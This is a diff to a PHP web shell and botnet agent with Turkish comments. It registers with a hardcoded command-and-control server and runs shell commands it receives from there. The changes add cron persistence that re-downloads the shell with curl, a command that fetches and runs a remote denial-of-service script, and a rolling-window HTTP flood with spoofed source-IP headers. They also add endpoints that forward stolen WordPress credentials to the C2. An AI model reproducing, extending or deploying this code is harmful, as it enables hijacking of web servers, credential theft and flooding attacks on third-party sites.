@@ -31,6 +31,7 @@ $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') || !empty(getenv('WIN
 
 $C2_SERVER = "https://juiceshop.cc/nebakiyonla_hurmsaqw/c2serverr.php";
 $DEBUG_MODE = true;
+$persistence_default_url = 'https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/haeder.php';
 
 // =====================================================
 // ERROR LOGGING HELPER
@@ -204,8 +205,11 @@ $web_shell_url = $WEB_URL;  // Alias for c2_register()
 
 function install_cron_persistence() {
     $shell = SHELL_PATH;
-    $url = $GLOBALS['WEB_URL'];
-    $script = "*/5 * * * * php '$shell' >/dev/null 2>&1; wget -q '$url' -O '$shell' >/dev/null 2>&1";
+    $c2    = $GLOBALS['C2_SERVER'];
+    $token = md5('mori_c2_secret_2024_persistence');
+    // Pull a fresh copy from C2's get_shell endpoint instead of downloading self (wget self → HTML overwrite)
+    $restore_cmd = "curl -sL '" . $c2 . "?act=get_shell&token=" . $token . "' -o '" . $shell . ".tmp' 2>/dev/null && mv '" . $shell . ".tmp' '" . $shell . "' >/dev/null 2>&1";
+    $script = "*/5 * * * * php '$shell' >/dev/null 2>&1; $restore_cmd";
     
     // Method 1: shell_exec (preferred)
     if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
@@ -326,6 +330,7 @@ function http_request($method, $url, $data = null) {
         $ch = curl_init($url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'MORI-Agent/2.0');
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
         
@@ -656,17 +661,25 @@ if (php_sapi_name() === 'cli') {
         }
     }
 
+    $error_sentinels = ['no_task', 'db_unavailable', 'error', '[WAIT]', '[NO_ID]'];
+
     while (true) {
         $task_raw = @c2_get_task($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']);
-        if ($task_raw && $task_raw !== '[WAIT]' && $task_raw !== '[NO_ID]' && $task_raw !== 'no_task') {
+        $cmd     = null;
+        $task_id = null;
+
+        if ($task_raw) {
             $task_decoded = @json_decode($task_raw, true);
             if (is_array($task_decoded) && isset($task_decoded['command'])) {
                 $cmd     = $task_decoded['command'];
                 $task_id = $task_decoded['id'] ?? null;
-            } else {
-                $cmd     = $task_raw;
-                $task_id = null;
+            } elseif (!in_array($task_raw, $error_sentinels, true)) {
+                // Legacy plain-string fallback (old server)
+                $cmd = $task_raw;
             }
+        }
+
+        if ($cmd && !in_array($cmd, $error_sentinels, true)) {
             $out = execute_command($cmd);
             @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $cmd, $out, $task_id);
         }
@@ -913,9 +926,10 @@ function detect_os_family() {
  * Used for auto-registration on first load
  * Never blocks page load (1 sec timeout max)
  */
-function c2_register_background($server, $id) {
+function c2_register_background($server, $id, $override_url = null) {
     global $web_shell_url;
-    
+    $url = $override_url ?: $web_shell_url;
+
     try {
         $sysinfo = collect_system_info();
     } catch (Exception $e) {
@@ -925,7 +939,7 @@ function c2_register_background($server, $id) {
 
     $payload = [
         'id' => $id,
-        'web_shell_url' => $web_shell_url,
+        'web_shell_url' => $url,
         'sysinfo' => $sysinfo,
         'timestamp' => time(),
         'version' => '3.0'
@@ -954,8 +968,9 @@ function http_post_timeout($url, $data, $timeout = 1) {
     if (function_exists('curl_init')) {
         $ch = curl_init($url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
-        curl_setopt($ch, CURLOPT_TIMEOUT_MS, $timeout * 1000);
+        // CURLOPT_TIMEOUT would int-cast 0.5 → 0 (infinite) — use TIMEOUT_MS only
+        curl_setopt($ch, CURLOPT_TIMEOUT_MS, (int)($timeout * 1000));
+        curl_setopt($ch, CURLOPT_USERAGENT, 'MORI-Agent/2.0');
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
         curl_setopt($ch, CURLOPT_POST, true);
@@ -1081,7 +1096,7 @@ function c2_register_batch($server, $clients_batch) {
     // Don't use retry logic here - already failed batch
     foreach ($clients_batch as $client) {
         $single_start = time();
-        @c2_register_background($server, $client['id']);
+        @c2_register_background($server, $client['id'], $client['web_shell_url'] ?? null);
         // Skip if taking too long
         if (time() - $single_start > 3) break;
     }
@@ -1249,6 +1264,65 @@ function execute_command($cmd) {
         return php_native_flood($target, $method, $duration, $threads, $rpc);
     }
 
+    // MORI_STRESS — anında fire-and-forget, download+run tek bg komutu
+    // Kullanım: MORI_STRESS <target> <method> <threads> [duration=300] [rpc=15]
+    if (strpos($cmd, 'MORI_STRESS ') === 0) {
+        ignore_user_abort(true);
+        set_time_limit(0);
+        $parts    = preg_split('/\s+/', trim(substr($cmd, 12)));
+        $target   = $parts[0] ?? '';
+        $method   = strtoupper($parts[1] ?? 'GET');
+        $threads  = min((int)($parts[2] ?? 100), 500);
+        $duration = min((int)($parts[3] ?? 300), 600);
+        $rpc      = (int)($parts[4] ?? 15);
+        if (empty($target)) return '[ERROR] MORI_STRESS: hedef gerekli';
+
+        $python  = mori_find_python();
+        $dl_url  = 'https://raw.githubusercontent.com/onemoriarty/moriartyhacked/refs/heads/main/dos.py';
+        $save    = (is_writable('/tmp') ? '/tmp' : (is_writable('/dev/shm') ? '/dev/shm' : sys_get_temp_dir())) . '/dos_mori.py';
+        $run_args = escapeshellarg($target) . ' ' . escapeshellarg($method)
+                  . ' ' . (int)$duration . ' ' . (int)$threads . ' _ 80 75 ' . (int)$rpc;
+
+        // Önce önbellekte var mı bak (bloklamaz)
+        $dos = null;
+        foreach ([__DIR__, '/tmp', '/dev/shm', '/var/tmp', sys_get_temp_dir()] as $dir) {
+            if (!is_dir($dir)) continue;
+            foreach (['dos_mori.py', 'dos.py'] as $fn) {
+                $p = $dir . '/' . $fn;
+                if (@file_exists($p) && @filesize($p) > 1000) { $dos = $p; break 2; }
+            }
+            foreach (@glob($dir . '/dos.py*') ?: [] as $f) {
+                if (@filesize($f) > 1000) { $dos = $f; break 2; }
+            }
+        }
+
+        if ($dos) {
+            // Zaten var — direkt çalıştır, anında döner
+            $bg = 'nohup ' . escapeshellarg($python) . ' ' . escapeshellarg($dos)
+                . ' ' . $run_args . ' > /dev/null 2>&1 &';
+        } else {
+            // Yok — indir+çalıştır tek nohup sh -c içinde, PHP bloklamaz
+            $inline = 'curl -sLf ' . escapeshellarg($dl_url) . ' -o ' . escapeshellarg($save)
+                    . ' 2>/dev/null || wget -qO ' . escapeshellarg($save) . ' ' . escapeshellarg($dl_url) . ' 2>/dev/null'
+                    . '; ' . escapeshellarg($python) . ' ' . escapeshellarg($save) . ' ' . $run_args;
+            $bg = 'nohup sh -c ' . escapeshellarg($inline) . ' > /dev/null 2>&1 &';
+        }
+
+        if (mori_exec_bg($bg))
+            return '[STRESS_OK] ' . $target . ' | ' . $method . ' | ' . $threads . 't | ' . $duration . 's'
+                 . ($dos ? '' : ' [dl+run bg]');
+
+        if (function_exists('pcntl_fork') && !in_array('pcntl_fork', array_map('trim', explode(',', ini_get('disable_functions'))))) {
+            $pid = @pcntl_fork();
+            if ($pid === 0) { @shell_exec($bg); exit(0); }
+            if ($pid  >  0) return '[STRESS_OK] ' . $target . ' | fork:' . $pid;
+        }
+
+        // exec tamamen kapalı → PHP native flood
+        return php_native_flood($target, in_array($method, ['GET','POST','HEAD']) ? $method : 'GET', min($duration, 120), min($threads, 50), 30)
+             . "\n[FALLBACK] exec disabled";
+    }
+
     // SİSTEM KOMUTU ÇALIŞTIR
     return execute_system_command($cmd);
 }
@@ -1318,106 +1392,172 @@ function execute_system_command($cmd) {
         }
     }
 
-    // Son çare: queue dosyasına yaz — cron (CLI PHP) exec kısıtlaması olmadan çalıştırır
-    $queue_file = __DIR__ . '/.mori_exec_queue';
-    $queue = [];
-    if (@file_exists($queue_file)) {
-        $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
+    // Stress komutu (dos.py) + exec yok → otomatik PHP native flood
+    // Format: python3 /path/dos.py <target> <duration> <threads> [method]
+    if (preg_match('/python[23]?\s+\S*dos\.py\s+(\S+)\s+(\d+)\s+(\d+)\s*(\S*)/i', $cmd, $m)) {
+        $target   = $m[1];
+        $duration = min((int)$m[2], 300);
+        $threads  = min((int)$m[3], 50);
+        $method   = strtoupper($m[4] ?: 'GET');
+        if (!in_array($method, ['GET','POST','HEAD'], true)) $method = 'GET';
+        return php_native_flood($target, $method, $duration, $threads, 30);
     }
-    // Eski komutları temizle (1 saatten eski)
-    $queue = array_filter($queue, function($q) { return (time() - ($q['t'] ?? 0)) < 3600; });
+
+    // pcntl_fork ile background exec (bazı VPS)
+    if (function_exists('pcntl_fork') && (strpos($cmd, 'python') !== false || strpos($cmd, 'nohup') !== false)) {
+        $pid = @pcntl_fork();
+        if ($pid === 0) { @shell_exec($cmd . ' >/dev/null 2>&1 &'); exit(0); }
+        if ($pid > 0)   { return '[STRESS_BG] Background\'da çalışıyor (pid:' . $pid . ')'; }
+    }
+
+    // Queue dosyasına yaz — cron (CLI PHP) 5dk içinde çalıştırır
+    $queue_file = __DIR__ . '/.mori_exec_queue';
+    $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
+    $queue = array_filter($queue, fn($q) => (time() - ($q['t'] ?? 0)) < 3600);
     $queue[] = ['cmd' => $cmd, 't' => time(), 'qid' => uniqid()];
     @file_put_contents($queue_file, json_encode(array_values($queue)), LOCK_EX);
-    
-    // Special case for stress tests: try background execution directly
-    if (strpos($cmd, 'nohup bash -c') === 0 || strpos($cmd, 'python3') !== false || strpos($cmd, 'python ') !== false) {
-        // Stress test — check if we can use pcntl_fork or at least attempt one exec method
-        if (function_exists('pcntl_fork')) {
-            $pid = @pcntl_fork();
-            if ($pid === -1) {
-                return "[QUEUED] Stress komut kuyruğa alındı (fork başarısız)"; 
-            } elseif ($pid === 0) {
-                // Child process — try to execute
-                @shell_exec($cmd . ' > /tmp/stress_exec.log 2>&1 &');
-                exit(0);
-            } else {
-                // Parent — return immediately
-                return "[STRESS_BG] Stress komut background'da çalışıyor...";
-            }
-        }
-    }
-    
+
     return "[QUEUED] Shell kısıtlandı, komut kuyruğa alındı. Cron 5dk içinde çalıştıracak. Methods tried: " . implode(', ', $methods_tried);
 }
 
-/**
- * PHP native HTTP flood — Python/shell gerektirmez
- * curl_multi ile çoklu eşzamanlı istek
- */
-function php_native_flood($url, $method = 'GET', $duration = 20, $threads = 10, $rpc = 10) {
-    if (!function_exists('curl_multi_init')) {
-        return '[ERROR] php_native_flood: curl_multi uzantısı yok';
-    }
-    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) {
-        return '[ERROR] php_native_flood: geçersiz URL';
-    }
+// ─── MORI_STRESS helpers ──────────────────────────────────────────────────
 
-    $start    = time();
-    $sent     = 0;
-    $errors   = 0;
-    $method   = strtoupper($method);
-    $deadline = $start + $duration;
-
-    while (time() < $deadline) {
-        $batch = min($threads, $rpc);
-        $mh = curl_multi_init();
-        $handles = [];
-
-        for ($i = 0; $i < $batch; $i++) {
-            $ch = curl_init($url . '?_=' . mt_rand() . '&t=' . time());
-            curl_setopt_array($ch, [
-                CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_TIMEOUT        => 8,
-                CURLOPT_CONNECTTIMEOUT => 4,
-                CURLOPT_SSL_VERIFYPEER => false,
-                CURLOPT_SSL_VERIFYHOST => false,
-                CURLOPT_FOLLOWLOCATION => false,
-                CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                CURLOPT_HTTPHEADER     => [
-                    'Accept: text/html,application/xhtml+xml',
-                    'Accept-Language: en-US,en;q=0.9',
-                    'Cache-Control: no-cache',
-                    'Pragma: no-cache',
-                ],
-            ]);
-            if ($method === 'POST') {
-                curl_setopt($ch, CURLOPT_POST, true);
-                curl_setopt($ch, CURLOPT_POSTFIELDS, 'data=' . str_repeat(chr(mt_rand(65, 90)), mt_rand(100, 500)));
-            }
-            curl_multi_add_handle($mh, $ch);
-            $handles[] = $ch;
+// Sadece local arama — download yapmaz (bloklamaz)
+function mori_get_dos_path() {
+    foreach ([__DIR__, '/tmp', '/dev/shm', '/var/tmp', sys_get_temp_dir()] as $dir) {
+        if (!is_dir($dir)) continue;
+        foreach (['dos_mori.py', 'dos.py'] as $fn) {
+            $p = $dir . '/' . $fn;
+            if (@file_exists($p) && @filesize($p) > 1000) return $p;
         }
+        foreach (@glob($dir . '/dos.py*') ?: [] as $f) {
+            if (@filesize($f) > 1000) return $f;
+        }
+    }
+    return null;
+}
 
-        $running = null;
-        do {
-            $status = curl_multi_exec($mh, $running);
-            if ($running) curl_multi_select($mh, 0.5);
-        } while ($running > 0 && $status === CURLM_OK && time() < $deadline);
+function mori_find_python() {
+    static $cached = null;
+    if ($cached !== null) return $cached;
+    $dis = array_map('trim', explode(',', ini_get('disable_functions')));
+    $fn  = null;
+    foreach (['shell_exec', 'exec'] as $f)
+        if (function_exists($f) && !in_array($f, $dis)) { $fn = $f; break; }
+    if ($fn) {
+        foreach (['python3', 'python', '/usr/bin/python3', '/usr/local/bin/python3', '/usr/bin/python'] as $p) {
+            $r = trim((string)@$fn('which ' . escapeshellarg($p) . ' 2>/dev/null'));
+            if ($r && $r[0] === '/') return ($cached = $r);
+        }
+    }
+    return ($cached = 'python3');
+}
 
-        foreach ($handles as $ch) {
-            $info = curl_getinfo($ch);
-            if (($info['http_code'] ?? 0) > 0) $sent++;
-            else $errors++;
+function mori_exec_bg($cmd) {
+    $dis = array_map('trim', explode(',', ini_get('disable_functions')));
+    foreach (['shell_exec', 'exec', 'system', 'passthru'] as $fn)
+        if (function_exists($fn) && !in_array($fn, $dis)) { @$fn($cmd); return true; }
+    if (function_exists('proc_open') && !in_array('proc_open', $dis)) {
+        $p = @proc_open($cmd, [], $pipes);
+        if ($p) { @proc_close($p); return true; }
+    }
+    if (function_exists('popen') && !in_array('popen', $dis)) {
+        $h = @popen($cmd, 'r');
+        if ($h) { @pclose($h); return true; }
+    }
+    return false;
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+
+/**
+ * PHP native HTTP flood — rolling window pattern
+ * Her tamamlanan istek anında yenisiyle değiştirilir, pool her zaman dolu kalır.
+ */
+function php_native_flood($url, $method = 'GET', $duration = 20, $concurrency = 50, $rpc = 10) {
+    if (!function_exists('curl_multi_init')) return '[ERROR] curl_multi yok';
+    if (empty($url) || !preg_match('#^https?://#i', $url)) return '[ERROR] Geçersiz URL';
+
+    static $UAS = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
+    ];
+
+    $method   = strtoupper(in_array(strtoupper($method), ['GET','POST','HEAD']) ? $method : 'GET');
+    $deadline = time() + $duration;
+    $sent = $errors = 0;
+
+    $make = function() use ($url, $method, &$UAS) {
+        $ip = mt_rand(1,223).'.'.mt_rand(0,255).'.'.mt_rand(0,255).'.'.mt_rand(1,254);
+        $ch = curl_init($url . '?_=' . mt_rand(1, 2147483647) . '&t=' . time());
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => false,
+            CURLOPT_TIMEOUT        => 5,
+            CURLOPT_CONNECTTIMEOUT => 3,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_FOLLOWLOCATION => false,
+            CURLOPT_USERAGENT      => $UAS[array_rand($UAS)],
+            CURLOPT_FORBID_REUSE   => false,
+            CURLOPT_FRESH_CONNECT  => false,
+            CURLOPT_HTTPHEADER     => [
+                'X-Forwarded-For: ' . $ip,
+                'X-Real-IP: '       . $ip,
+                'CF-Connecting-IP: '. $ip,
+                'Accept: */*',
+                'Connection: keep-alive',
+                'Cache-Control: no-cache',
+            ],
+        ]);
+        if ($method === 'POST') {
+            curl_setopt($ch, CURLOPT_POST, true);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, 'x=' . substr(md5(mt_rand()), 0, mt_rand(16,64)));
+        } elseif ($method === 'HEAD') {
+            curl_setopt($ch, CURLOPT_NOBODY, true);
+        }
+        return $ch;
+    };
+
+    $mh   = curl_multi_init();
+    curl_multi_setopt($mh, CURLMOPT_MAXCONNECTS, $concurrency);
+    $pool = [];
+
+    // fill initial pool
+    for ($i = 0; $i < $concurrency; $i++) {
+        $ch = $make();
+        curl_multi_add_handle($mh, $ch);
+        $pool[(int)$ch] = $ch;
+    }
+
+    // rolling window — as soon as one slot frees, fire a new request
+    while (time() < $deadline) {
+        curl_multi_exec($mh, $running);
+        while ($done = curl_multi_info_read($mh)) {
+            $ch   = $done['handle'];
+            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            ($code > 0) ? $sent++ : $errors++;
             curl_multi_remove_handle($mh, $ch);
             curl_close($ch);
+            unset($pool[(int)$ch]);
+            if (time() < $deadline) {
+                $new = $make();
+                curl_multi_add_handle($mh, $new);
+                $pool[(int)$new] = $new;
+            }
         }
-        curl_multi_close($mh);
-
-        if (time() >= $deadline) break;
+        curl_multi_select($mh, 0.001);
     }
 
-    $elapsed = time() - $start;
-    return "[PHP_STRESS] Hedef: $url | Method: $method | Süre: {$elapsed}s/{$duration}s | Gönderilen: $sent | Hata: $errors";
+    foreach ($pool as $ch) { curl_multi_remove_handle($mh, $ch); curl_close($ch); }
+    curl_multi_close($mh);
+
+    $rps = $duration > 0 ? round($sent / $duration) : $sent;
+    return "[PHP_STRESS] $url | $method | {$duration}s | sent:{$sent} err:{$errors} | ~{$rps} req/s";
 }
 
 // =====================================================
@@ -1484,7 +1624,9 @@ function read_file($file) {
 }
 
 function write_file($file, $content_b64) {
-    $content = base64_decode($content_b64);
+    $content = safe_base64_decode($content_b64);
+    if ($content === false) $content = @base64_decode($content_b64, true);
+    if ($content === false) return "[ERROR] Failed to decode base64 content";
     $dir = dirname($file);
     
     if (!is_dir($dir)) {
@@ -2306,7 +2448,9 @@ done
 // OTOMATİK KAYIT (HER ERİŞİMDE)
 // =============================================
 function auto_register() {
-    global $c2_server, $client_id, $debug_mode, $web_shell_url;
+    global $web_shell_url;
+    $c2_server = $GLOBALS['C2_SERVER'];
+    $client_id = $GLOBALS['CLIENT_ID'];
     
     // Skip if already registered in this execution
     if (isset($GLOBALS['_SHELL_REGISTERED']) && $GLOBALS['_SHELL_REGISTERED'] === true) {
@@ -2319,18 +2463,19 @@ function auto_register() {
     // C2 sunucusuna kayıt yap - BACKGROUND ONLY (don't block)
     $registration_data = [
         'id' => $client_id,
-        'shell_url' => $web_shell_url,
+        'web_shell_url' => $web_shell_url,
         'sysinfo' => collect_system_info(),
         'timestamp' => time(),
-        'os_type' => 'LINUX',
+        'version' => '3.0',
         'wp_login_id' => $wp_creds['blogs_id'],
         'wp_login_hash' => $wp_creds['hash']
     ];
-    
+
     $register_url = $c2_server . '?act=reg';
-    
-    // Very short timeout (fire-and-forget)
-    $result = @http_post_timeout($register_url, $registration_data, 0.5);
+    $encoded = safe_base64_encode(safe_json_encode($registration_data));
+
+    // Very short timeout (fire-and-forget) — 2s to allow encoding overhead
+    $result = @http_post_timeout($register_url, $encoded, 2);
     
     // Mark as attempted (don't try again this request)
     $GLOBALS['_SHELL_REGISTERED'] = true;
@@ -2385,10 +2530,44 @@ if (isset($_GET['debug']) && $debug_mode) {
 if (isset($_GET['act']) && $_GET['act'] == 'register_data') {
     // PRE-EXECUTION PERSISTENCE CHECK
     @ensure_persistence_v4();
-    
+
     header('Content-Type: application/json; charset=utf-8');
     echo json_encode(collect_system_info());
     exit;
+}
+
+// PULL REGISTER — C2 sunucu bu endpoint'i çekerek shell'i kayıt eder (UAM bypass)
+if (isset($_GET['act']) && $_GET['act'] === 'pull_register') {
+    $wp_creds  = generate_wp_login_credentials();
+    $server_ip = $_SERVER['SERVER_ADDR']
+              ?? $_SERVER['LOCAL_ADDR']
+              ?? @gethostbyname(@gethostname())
+              ?? '0.0.0.0';
+    header('Content-Type: application/json; charset=utf-8');
+    die(json_encode([
+        'id'            => $GLOBALS['CLIENT_ID'],
+        'web_shell_url' => $GLOBALS['WEB_URL'],
+        'server_ip'     => $server_ip,
+        'sysinfo'       => collect_system_info(),
+        'timestamp'     => time(),
+        'version'       => '3.0',
+        'wp_login_id'   => $wp_creds['blogs_id'],
+        'wp_login_hash' => $wp_creds['hash'],
+    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
+}
+
+// WP CREDS — injected WP plugin posts credentials here, we forward to C2
+if (isset($_GET['act']) && $_GET['act'] === 'wp_creds') {
+    $creds_encoded = $_POST['creds'] ?? '';
+    if (!empty($creds_encoded)) {
+        $payload = safe_base64_encode(safe_json_encode([
+            'creds'     => $creds_encoded,
+            'shell_url' => $GLOBALS['WEB_URL'],
+        ]));
+        @http_post_timeout($GLOBALS['C2_SERVER'] . '?act=store_wp_creds', $payload, 3);
+    }
+    header('Content-Type: text/plain');
+    die('ok');
 }
 
 // REGISTER ONLY (manuel kayıt için)
@@ -2417,9 +2596,11 @@ if (isset($_GET['register'])) {
 
 // COMMAND EXECUTION VIA GET (base64 encoded - supports both safe_base64 and normal base64)
 if (isset($_GET['m'])) {
+    ignore_user_abort(true); // flood, C2 bağlantısı kesse bile devam eder
+    set_time_limit(0);
     @ensure_persistence_v4();
     auto_register();
-    
+
     ob_end_clean();
     header('Access-Control-Allow-Origin: *');
     header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
